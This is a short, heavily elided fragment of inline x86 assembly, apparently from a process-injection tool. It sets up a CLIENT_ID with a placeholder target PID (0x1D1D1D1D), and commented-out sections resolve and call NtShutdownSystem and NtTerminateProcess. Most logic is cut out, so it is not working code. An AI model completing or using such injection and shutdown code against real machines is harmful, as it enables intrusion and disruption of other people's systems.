...
///////////////////////////////////fix relocations
	...
	*/
	...
	rdtstc1:
		...
		lea eax, ProcInfo
		cmp [eax]ProcInfo.UniqueProcessId, 0x1D1D1D1D		//Compare with the placeholder that holds the PID given by the user
	...
	//////////////////////////////////////////////////injection
		...
		*/
		...
		//////CLIENT_ID struct
		lea eax, ClientID
		mov [eax]ClientID.UniqueProcess, 0x1D1D1D1D	//pid do it dynamically
...
/*
	////////////////find Nt_ShutdownSystem function
		...
		call Nt_ShutdownSystem
			*/
	////////////////find Nt_TerminateProcess function
